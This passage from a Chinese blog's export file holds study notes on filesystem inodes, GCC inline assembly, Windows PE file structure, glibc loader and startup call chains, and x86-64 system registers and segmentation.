<p>在每个inode中，实际上是所有关于文件的信息：文件类型（例如，常规文件、目录等）、大小、分配给它的块数、保护信息（如谁拥有该文件以及谁可以访问它）、一些时间信息（包括文件创建、修改或上次访问的时间文件下），以及有关其数据块驻留在磁盘上的位置的信息（如某种类型的指针）。我们将所有关于文件的信息称为元数据（metadata）。实际上，文件系统中除了纯粹的用户数据外，其他任何信息通常都称为元数据。</p>
</blockquote>
<h3 id="如何获取inode所在的扇区地址"><a href="#如何获取inode所在的扇区地址" class="headerlink" title="如何获取inode所在的扇区地址"></a>如何获取inode所在的扇区地址</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">blk    = (inumber * <span class="built_in">sizeof</span>(<span class="type">inode_t</span>)) / blockSize;</span><br><span class="line">sector = ((blk * blockSize) + inodeStartAddr) / sectorSize;</span><br></pre></td></tr></table></figure>

<h3 id="数据位置的引用"><a href="#数据位置的引用" class="headerlink" title="数据位置的引用"></a>数据位置的引用</h3><blockquote>
<p>设计inode时，最重要的决定之一是它如何引用数据块的位置。</p>
<p>这里学习了三种，一种为多级索引的方法，一种为基于范围的方法，基于链表的方法</p>
<p>多级索引主要用于解决指针数不够，以至于无法支持大文件的情形。</p>
<p>基于范围的方法主要是用指针加范围的形式来定位数据</p>
<p>基于链表的方法则是通过数据块的末尾加上指针将数据串接起来</p>
</blockquote>
<h3 id="目录存储方式"><a href="#目录存储方式" class="headerlink" title="目录存储方式"></a>目录存储方式</h3><blockquote>
<p>在VSFS中（像许多文件系统一样），目录的组织很简单。一个目录基本上只包含一个二元组（条目名称，inode号）的列表。对于给定目录中的每个文件或目录，目录的数据块中都有一个字符串和一个数字。对于每个字符串，可能还有一个长度（假定采用可变大小的名称）。</p>
<p>通常，文件系统将目录视为特殊类型的文件。因此，目录有一个inode，位于inode表中的某处（inode表中的inode标记为“目录”的类型字段，而不是“常规文件”）。该目录具有由inode指向的数据块（也可能是间接块）。这些数据块存在于我们的简单文件系统的数据块区域中。</p>
</blockquote>
<h3 id="访问过程"><a href="#访问过程" class="headerlink" title="访问过程"></a>访问过程</h3><blockquote>
<p>关于<code>open(&quot;/foo/bar&quot;, O_RDONLY)</code></p>
<p>文件系统首先需要找到文件bar的inode,文件系统必须遍历（traverse）路径名，从而找到所需的inode。</p>
</blockquote>
<ol>
<li>遍历根目录（root directory），它就记为&#x2F;,文件系统的第一次磁盘读取是根目录的inode,根的inode号必须是“众所周知的”。根的inode号为2。因此，要开始该过程，文件系统会读入inode号2的块（第一个inode块）。</li>
<li>寻找foo的条目。通过读入一个或多个目录数据块，它将找到foo的条目。一旦找到，文件系统也会找到下一个需要的foo的inode号</li>
<li>文件系统读取包含foo的inode及其目录数据的块，最后找到bar的inode号。在每个进程的打开文件表中，为此进程分配一个文件描述符，并将它返回给用户。</li>
</ol>
<blockquote>
<p>关于写入,文件已存在</p>
<p>每次写入操作不仅需要将数据写入磁盘，还必须首先决定将哪个块分配给文件，从而相应地更新磁盘的其他结构（例如数据位图和inode）。</p>
</blockquote>
<ol>
<li>首先，文件必须打开（如上所述）</li>
<li>一个读取数据位图（然后更新以标记新分配的块被使用），2次IO</li>
<li>一个写入位图（将它的新状态存入磁盘），再有两次I&#x2F;O，其中一次是读取inode，另一次是写inode（为了更新块的位置）</li>
<li>写入真正的数据块本身</li>
<li>综上所用5次IO</li>
</ol>
<blockquote>
<p>文件创建</p>
</blockquote>
<ol>
<li>一个读取inode位图（查找空闲inode）</li>
<li>一个写入inode位图（将其标记为已分配）</li>
<li>一个写入新的inode本身（初始化它）</li>
<li>一个写入目录的数据（将文件的高级名称链接到它的inode号）</li>
<li>以及一个读写目录inode以便更新它。</li>
<li>如果目录需要增长以容纳新条目，则还需要额外的I&#x2F;O（即数据位图和新目录块）。</li>
</ol>
<h3 id="何为挂载？"><a href="#何为挂载？" class="headerlink" title="何为挂载？"></a>何为挂载？</h3><p>挂载即把文件系统装入到内存中，可以直接通过文件资源管理器来访问文件。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>os</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/08/31/qemu%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>x86-64内联汇编</title>
    <url>/2024/08/30/x86-64%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<p>总结：<a href="https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Using-Assembly-Language-with-C.html</a></p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>基本的 <code>asm</code> 语句</strong>：这是没有操作数的汇编语句（参见 Basic Asm - Assembler Instructions Without Operands）。它用于直接插入汇编代码，而不需要与 C 代码中的变量或表达式进行交互。</p>
<p><strong>扩展的 <code>asm</code> 语句</strong>：这种语句包括一个或多个操作数（参见 Extended Asm - Assembler Instructions with C Expression Operands）。扩展形式允许你将 C 语言中的表达式与汇编代码进行混合使用，使得在一个函数中可以更好地结合 C 语言和汇编语言。这种形式通常是更优选的。</p>
<h2 id="basic-asm"><a href="#basic-asm" class="headerlink" title="basic_asm"></a>basic_asm</h2><h3 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h3><blockquote>
<p>因为gcc扩展的原因，做好写为：<code>__asm__</code>的形式</p>
<h4 id="qualifiers："><a href="#qualifiers：" class="headerlink" title="qualifiers："></a>qualifiers：</h4><p>The optional <code>volatile</code> qualifier has no effect. All basic <code>asm</code> blocks are implicitly volatile.防止代码优化，但是没啥用</p>
<p>inline：貌似没有啥大用</p>
<h4 id="Parameters：汇编指令"><a href="#Parameters：汇编指令" class="headerlink" title="Parameters：汇编指令"></a>Parameters：汇编指令</h4></blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="keyword">asm</span>-qualifiers ( AssemblerInstructions )</span><br><span class="line">__asm__ <span class="keyword">asm</span>-qualifiers ( AssemblerInstructions )</span><br></pre></td></tr></table></figure>

<h2 id="extend-asm"><a href="#extend-asm" class="headerlink" title="extend_asm"></a>extend_asm</h2><h3 id="形式-1"><a href="#形式-1" class="headerlink" title="形式"></a>形式</h3><blockquote>
<h4 id="qualifiers：多个个goto标签"><a href="#qualifiers：多个个goto标签" class="headerlink" title="qualifiers：多个个goto标签"></a>qualifiers：多个个goto标签</h4><h4 id="OutputOperands：c变量，由指令修改"><a href="#OutputOperands：c变量，由指令修改" class="headerlink" title="OutputOperands：c变量，由指令修改"></a>OutputOperands：c变量，由指令修改</h4><h4 id="InputOperands：c变量，输入到指令"><a href="#InputOperands：c变量，输入到指令" class="headerlink" title="InputOperands：c变量，输入到指令"></a>InputOperands：c变量，输入到指令</h4><h4 id="Clobbers：更改的寄存器列表"><a href="#Clobbers：更改的寄存器列表" class="headerlink" title="Clobbers：更改的寄存器列表"></a>Clobbers：更改的寄存器列表</h4><h4 id="GotoLabels：可以跳到的范围"><a href="#GotoLabels：可以跳到的范围" class="headerlink" title="GotoLabels：可以跳到的范围"></a><em>GotoLabels</em>：可以跳到的范围</h4><p>注意：输入+输出+goto操作数的总数限制为30。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm asm-qualifiers ( AssemblerTemplate </span><br><span class="line">                      : OutputOperands</span><br><span class="line">                      : InputOperands</span><br><span class="line">                      : Clobbers</span><br><span class="line">                      : GotoLabels)</span><br></pre></td></tr></table></figure>

<h3 id="Special-format-strings-¶"><a href="#Special-format-strings-¶" class="headerlink" title="Special format strings ¶"></a>Special format strings<a href="https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Extended-Asm.html#Special-format-strings"> ¶</a></h3><h3 id="OutputOperands"><a href="#OutputOperands" class="headerlink" title="OutputOperands"></a>OutputOperands</h3><blockquote>
<p><strong>输出约束必须以 <code>=</code> 或 <code>+</code> 开头</strong>：</p>
<p>**<code>=</code>**：表示这个操作数是一个纯输出操作数，即汇编代码会将新的值写入这个操作数，覆盖其原有的内容。编译器会将这个操作数视为新的输出，不会依赖它在汇编代码执行前的值。</p>
<p>**<code>+</code>**：表示这个操作数既是输入又是输出。汇编代码会读取这个操作数的原始值，并且在执行后将新的值写回操作数中。</p>
<p>约束为了让编译器做出正确的行为</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ [asmSymbolicName] ] constraint (cvariablename)</span><br></pre></td></tr></table></figure>

<h3 id="InputOperands"><a href="#InputOperands" class="headerlink" title="InputOperands"></a>InputOperands</h3><blockquote>
<p>和输出操作数差不多，不同的是约束不能以&#x3D;与+开头</p>
</blockquote>
]]></content>
      <categories>
        <category>cs</category>
        <category>汇编</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>架构</tag>
        <tag>amd64</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构</title>
    <url>/2024/08/26/pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64</a></p>
<p><a href="https://www.cnblogs.com/Hekeats-L/p/17997054">https://www.cnblogs.com/Hekeats-L/p/17997054</a></p>
<p>《逆向工程核心原理》</p>
<p><a href="https://chatgpt.com/c/66dc593d-c970-8013-8cae-88fcd3d98948">https://chatgpt.com/c/66dc593d-c970-8013-8cae-88fcd3d98948</a></p>
<h2 id="DOS-HEADER"><a href="#DOS-HEADER" class="headerlink" title="DOS HEADER"></a>DOS HEADER</h2><blockquote>
<p>兼容老版本</p>
</blockquote>
<h2 id="DOS-STUB"><a href="#DOS-STUB" class="headerlink" title="DOS STUB"></a>DOS STUB</h2><p>DOS stub 是一种嵌入在 Windows 可执行文件（PE 文件）中的小程序，主要用于在 DOS 环境下运行这些文件时提供提示信息。它的主要作用可以概括为以下几点：</p>
<ol>
<li><p><strong>兼容性</strong>：在 16 位 DOS 系统中运行 32 位或 64 位的 Windows 可执行文件（PE 文件）时，DOS stub 提供一个简单的提示，告知用户此文件不能在 DOS 环境下运行。通常会显示类似于 <code>This program cannot be run in DOS mode</code> 的信息。</p>
</li>
<li><p><strong>历史原因</strong>：DOS stub 起源于早期的 Windows 系统，当时 Windows 是基于 DOS 系统开发的。为了兼容旧的 DOS 环境，Windows 的可执行文件保留了 DOS stub。虽然现代系统不再需要这种功能，但为了保持格式的一致性，DOS stub 依然被保留。</p>
</li>
<li><p><strong>最小化程序</strong>：在某些情况下，开发者可以自定义 DOS stub 的内容，甚至可以让它执行一些简单的功能。但通常情况下，DOS stub 仅仅是一个输出错误提示的占位符。</p>
</li>
</ol>
<p>典型的 DOS stub 是一个非常小的 16 位程序，占用几乎忽略不计的空间，作用也相当有限，主要用于历史兼容性。</p>
<h2 id="IMAGE-NT-HEADERS64"><a href="#IMAGE-NT-HEADERS64" class="headerlink" title="_IMAGE_NT_HEADERS64"></a>_IMAGE_NT_HEADERS64</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>

<h3 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h3><blockquote>
<p>个人理解类似于文件签名的东西（函数签名），用来区分文件的信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h3 id="IMAGE-OPTIONAL-HEADER64"><a href="#IMAGE-OPTIONAL-HEADER64" class="headerlink" title="IMAGE_OPTIONAL_HEADER64"></a>IMAGE_OPTIONAL_HEADER64</h3><blockquote>
<p>和文件的执行信息有关，总体的内存分配以及入口点之类的信息,其中描述了一些个导入表，导出表加载的RVA</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  ULONGLONG            ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  ULONGLONG            SizeOfStackReserve;</span><br><span class="line">  ULONGLONG            SizeOfStackCommit;</span><br><span class="line">  ULONGLONG            SizeOfHeapReserve;</span><br><span class="line">  ULONGLONG            SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<h2 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="_IMAGE_SECTION_HEADER"></a>_IMAGE_SECTION_HEADER</h2><blockquote>
<p>为下面结构体的数组组成，描述了每一个section的基本信息，主要描述了每一个节加载的虚拟地址也就是（RVA）。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小插曲：文件偏移需虚拟地址的换算。</p>
</blockquote>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240907220600172.png" alt="image-20240907220600172"></p>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240907220617402.png" alt="image-20240907220617402"></p>
<h2 id="一些节（用section-header定位）"><a href="#一些节（用section-header定位）" class="headerlink" title="一些节（用section_header定位）"></a>一些节（用section_header定位）</h2><blockquote>
<p>下面学习的是节中的重要的数据结构</p>
</blockquote>
<h3 id="IMAGE-IMPORT-DESCRIPTOR（比较重要的部分，也是存放再section中的）"><a href="#IMAGE-IMPORT-DESCRIPTOR（比较重要的部分，也是存放再section中的）" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR（比较重要的部分，也是存放再section中的）"></a>IMAGE_IMPORT_DESCRIPTOR（比较重要的部分，也是存放再section中的）</h3><blockquote>
<p>类似于linux中的got表,可以通过optional header来定位，其中描述了其的RVA，先定位属于哪一个section，之后再根据与section rva的差值加上其文件偏移地址（point to raw data）来定位</p>
<p>一个descriptior描述的是一个动态动态链接库的导入函数的内容</p>
<p>INT存储的是导入函数名称的地址，每个占8字节（其中的值都是rva因此需要换算）</p>
<p>IAT存储的是导入函数的地址，但是一开始存放的和INT是一样的东西</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;<span class="comment">//指向导入名称表（INT）</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;<span class="comment">//库名称</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">//指向导入地址表（IAT）</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>直观图解</p>
</blockquote>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240908000341512.png"></p>
<h3 id="struct-IMAGE-EXPORT-DIRECTORY"><a href="#struct-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="struct IMAGE_EXPORT_DIRECTORY"></a>struct IMAGE_EXPORT_DIRECTORY</h3><blockquote>
<p>一般在库中记录这函数的名称以及地址，结构如下：</p>
</blockquote>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240908004842227.png" alt="image-20240908004842227"></p>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240908004857794.png" alt="image-20240908004857794"></p>
<blockquote>
<p>010editor比较方便，详细记录着每个函数的名称所在位置，以及地址</p>
</blockquote>
<p><img src="/../../themes/diaspora/source/img/mypic/com/image-20240908004936344.png" alt="image-20240908004936344"></p>
<blockquote>
<p>总体函数查找流程为：1.查找nameadd，找到对应的name，然后几下相应的索引，从original中取值，将此值作为add的查找索引。</p>
</blockquote>
<h2 id="关于patchpe"><a href="#关于patchpe" class="headerlink" title="关于patchpe"></a>关于patchpe</h2>]]></content>
      <categories>
        <category>cs</category>
        <category>windows</category>
        <category>文件结构</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>pe</tag>
      </tags>
  </entry>
  <entry>
    <title>一些库调用链</title>
    <url>/2024/08/17/%E4%B8%80%E4%BA%9B%E5%BA%93%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="关于链接器的库装载过程"><a href="#关于链接器的库装载过程" class="headerlink" title="关于链接器的库装载过程"></a>关于链接器的库装载过程</h1><p>学习了动态链接的过程之后，想深入学习一下，奈何实现过程过于复杂，实在没有能力去理解代码，就了解一下其调用过程吧，以64位程序动态链接为例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start -&gt; _dl_start，这两步主要是链接器的自举，跳过中间几步的关于数据收集的一些函数就到了</span><br><span class="line">dl_main这个函数，可以看出实现基本尚在rtld.c这个文件，但最开始start的函数是在dl-machine.h定义的，可以自行观看。</span><br><span class="line"></span><br><span class="line">pwndbg&gt; info b</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">6       breakpoint     keep y   0x00007ffff7fe44e0 in elf_machine_rela at ../sysdeps/x86_64/dl-machine.h:323</span><br><span class="line">7       breakpoint     keep y   0x00007ffff7fe4030 in _dl_start at ./elf/rtld.c:527</span><br><span class="line">8       breakpoint     keep y   0x00007ffff7fe4517 in _dl_start at ./elf/rtld.c:588</span><br><span class="line">9       breakpoint     keep y   0x00007ffff7fe48e0 in dl_main at ./elf/rtld.c:1320</span><br><span class="line">10      breakpoint     keep y   &lt;MULTIPLE&gt;         </span><br><span class="line">        breakpoint already hit 1 time</span><br><span class="line">10.1                        y   0x0000555555555060 &lt;_start&gt;</span><br><span class="line">10.2                        y   0x00007ffff7fe3290 &lt;_start&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../../themes/butterfly/source/img/mypic/dlmain.png" alt="dlmain.png"></p>
<p>可以看出dlmain是完成装载的核心函数。因此想要分析链接器的实现可以从上述调用链入手。但是慎入吧。</p>
<h1 id="关于main执行前的一些步骤以及程序退出处理"><a href="#关于main执行前的一些步骤以及程序退出处理" class="headerlink" title="关于main执行前的一些步骤以及程序退出处理"></a>关于main执行前的一些步骤以及程序退出处理</h1><blockquote>
<p>除了链接器中有<code>__start</code>函数，动态链接库中也有，会在main开始之前完成一些列复杂操作，但是在此之前发现了个好玩的东西，也就是在<code>__start</code>函数执行前，动态链接器还会执行<code>_dl_init</code>等函数，好像是库依赖关系之间的处理，不知道是干什么的。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行链，不知道是不是因为程序不是c++，所以没有调用csu，c++的估计才是完全版</span><br><span class="line">_start-&gt;__libc_start_main-&gt;__cxa_atexit（貌似是析构函数的注册表）-&gt;init(进行main前的准备)-&gt;frame_dummy(这玩意困惑了好长时间一直不知道干什么有机会深入研究吧)-&gt; _dl_audit_preinit(又是一个奇怪的东西)-&gt;__libc_start_call_main(还好没有跳过，这个函数里面会调用main函数...)-&gt;main-&gt;exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors-&gt;_dl_fini(看样子进入和退出都会经过连接器啊)-&gt;_IO_cleanup(刷新IO)-&gt;_exit(最后的最后调用系统调用kill掉pro)</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>库</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-64存储模型</title>
    <url>/2024/08/29/x86-64%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><h3 id="system-register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）"><a href="#system-register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）" class="headerlink" title="system register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）"></a>system register（硬件基础，寄存器是计算机硬件的一个抽象，体系结构的思想）</h3><blockquote>
<p>CR:用于控制系统的重要行为，例如分页分段之类</p>
<p><em>System-Flags Register</em>：一些标志位，进入内核态时需要保存</p>
<p><em>Descriptor-Table Registers</em>：指向一些描述内存的数据结构</p>
<p>Task- Reg ： 包含任务状态段的位置以及大小</p>
<p><em>Debug Registers</em>：控制软件调试</p>
<p><em>Extended-Feature-Enable Register</em>：EFER寄存器用于启用和报告非由CRn控制寄存器控制的特殊功能的状态。特别是，EFER被用于控制长模式的激活。</p>
<p><em>System-Configuration Register</em>：启用和配置系统总线功能。</p>
<p><em>System-Linkage Registers</em>：这些寄存器被系统链接指令用于指定操作系统入口点、堆栈位置和指向系统数据结构的指针。（可以看出若陷入os，其作用及其重要）</p>
<p><em>Memory-Typing Registers</em>：目前没见过用法</p>
<p><em>Debug-Extension Registers</em>：debug扩展</p>
<p><em>Performance-Monitoring Registers</em>：性能监视寄存器用于计数处理器和系统事件，或事件的持续时间。</p>
<p><em>Machine-Check Registers</em>：机器检查寄存器控制处理器对不可恢复故障的响应。它们还用于将有关此类故障的信息报告给旨在响应此类故障的系统实用程序。</p>
</blockquote>
<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/sysregs.png" alt="image-20240829220943843"></p>
<h3 id="System-Data-Structures（软件基础）"><a href="#System-Data-Structures（软件基础）" class="headerlink" title="System-Data Structures（软件基础）"></a><strong>System-Data Structures</strong>（软件基础）</h3><blockquote>
<p>系统数据结构由系统软件创建和维护，以供处理器在受保护模式下运行时使用。在受保护模式下运行的处理器使用这些数据结构来管理内存和保护，并在中断或任务切换发生时存储程序状态信息</p>
<p>descriptors：描述符向处理器提供有关段的信息，例如它的位置、大小和特权级别。一种特殊类型的描述符，称为门，用于为软件例程提供代码选择器和入口点。可以定义任意数量的描述符，但是系统软件必须至少要为当前执行的代码段和堆栈段创建一个描述符。</p>
<p>descriptor table：全局描述符表包含对所有程序都可用的描述符，而本地描述符表包含由单个程序所使用的描述符。中断描述符表只包含由中断处理所使用的gate描述符</p>
<p>task-state segment：任务状态段是用于保存特定程序或任务的处理器状态信息的特殊段。它还包含在切换到更多特权程序时使用的堆栈指针。硬件多任务处理机制在挂起和恢复任务时使用段中的状态信息。调用和对交换堆栈的中断会导致从任务状态段读取堆栈指针。</p>
<p><em>Page-Translation Tables</em>：</p>
</blockquote>
<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/sysdatastructor.png" alt="image-20240829222638775"></p>
<h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><blockquote>
<p>这个是策略，机制是分段和分页以及地址的表示形式那些。</p>
</blockquote>
<blockquote>
<p>感觉好复杂，主要看一下保护模式下的内存模型吧,文档原话</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传统的x86架构支持一种段翻译机制，允许系统软件将指令和数据重新定位并隔离到虚拟内存空间中的任意位置。一个段是在线性地址空间内的一块连续内存。段在线性地址空间中的大小和位置是任意的。指令和数据可以分配到一个或多个内存段中，每个段都有其自身的保护特性。处理器硬件强制执行规则，规定一个段是否可以访问另一个段。</span><br><span class="line"></span><br><span class="line">分段机制提供了十个段寄存器，每个寄存器定义了一个段。这十个段寄存器中有六个（CS、DS、ES、FS、GS 和 SS）定义了用户段。用户段存储软件、数据和栈，可以被应用软件和系统软件使用。剩下的四个段寄存器（GDT、LDT、IDT 和 TR）定义了系统段。系统段包含的数据结构仅由系统软件初始化和使用。段寄存器包含一个基址，指向段的起始位置；一个限值，定义段的大小；以及定义段保护特性的属性。</span><br><span class="line"></span><br><span class="line">尽管分段在软件和数据的重新定位和保护方面提供了很大的灵活性，但通常通过结合软件和硬件分页支持来处理内存隔离和重新定位更加高效。因此，大多数现代系统软件绕过了分段功能。然而，分段不能完全禁用，理解分段机制对于实现长模式（long mode）系统软件仍然非常重要。</span><br></pre></td></tr></table></figure>

<h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h3><blockquote>
<p>如其名，不赘述了</p>
</blockquote>
<h3 id="Virtual-8086-Mode-Segmentation"><a href="#Virtual-8086-Mode-Segmentation" class="headerlink" title="Virtual-8086 Mode Segmentation"></a><strong>Virtual-8086 Mode Segmentation</strong></h3><blockquote>
<p>到这好像有虚拟内存了，然后利用分段，实现了更多的空间利用，但是感觉分页并不成熟</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟8086模式支持在保护模式下运行16位实模式程序（详见下文）。它使用了一种简单的内存分段方式，可选的分页机制，以及有限的保护检查。在虚拟8086模式下运行的程序最多可以访问1MB的内存空间。</span><br><span class="line"></span><br><span class="line">与实模式下的分段一样，每个64K的段（CS、DS、ES、FS、GS、SS）在16字节边界上对齐。段基址是给定段中的最低地址，等于段选择子乘以16。POP和MOV指令的工作方式与实模式完全相同，可以用来将一个（可能是新的）段选择子加载到某个段寄存器中。当发生这种情况时，选择子会更新，段基址会被设置为选择子乘以16。段限值和段属性不会改变，通常它们分别是64K（允许的最大限值）和读/写数据。</span><br><span class="line"></span><br><span class="line">除中断和异常外，远程传输（FAR transfers）的操作与实模式相同。在远程传输时，CS（代码段）选择子会更新为新值，CS段基址会设置为选择子乘以16。CS段限值和属性保持不变，但通常分别为64K和读/写属性。中断和异常会将处理器切换到保护模式。（更多信息请参见第8章“异常和中断”）。</span><br></pre></td></tr></table></figure>

<h3 id="Protected-Mode-Segmented-Memory-Models"><a href="#Protected-Mode-Segmented-Memory-Models" class="headerlink" title="Protected Mode Segmented-Memory Models"></a><strong>Protected Mode Segmented-Memory Models</strong></h3><blockquote>
<p>现在的主流，若开启部分分段，则可以向后兼容，如果全分页的话就是平坦内存模式</p>
</blockquote>
